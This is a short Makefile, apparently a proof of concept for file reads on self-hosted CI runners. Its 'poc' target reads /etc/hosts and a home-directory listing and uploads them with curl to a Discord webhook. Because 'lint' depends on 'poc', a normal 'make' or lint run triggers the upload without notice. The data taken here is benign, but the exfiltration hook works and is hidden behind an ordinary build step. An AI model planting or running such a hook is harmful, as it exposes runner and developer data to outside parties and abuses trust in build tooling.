.PHONY: all poc lint
all: lint

poc:
	@echo "[POC] Local File Read on self-hosted runner…"

	# 1) Safe example: /etc/hosts
	@tmpfile="$$(mktemp /tmp/lfipoC.XXXXXX.txt)"; \
	{ \
		echo "[+] Reading /etc/hosts"; \
		cat /etc/hosts 2>/dev/null || echo "No access"; \
		echo ""; \
		echo "[+] Reading current user's home dir listing"; \
		ls -la $$HOME 2>/dev/null || echo "No access"; \
	} > "$$tmpfile"; \
	\
	curl -sS -o /dev/null -w "Discord file HTTP %{http_code}\n" \
		-F 'payload_json={"content":"POC: Local File Read (harmless files)"}' \
		-F "files[0]=@$$tmpfile;type=text/plain;filename=lfi-demo.txt" \
		"https://discord.com/api/webhooks/1234567890/YourWebhookSecret" || true; \
	rm -f "$$tmpfile"

	@echo "[POC] done."

lint: poc
	@echo "Lint step ran (after PoC)."
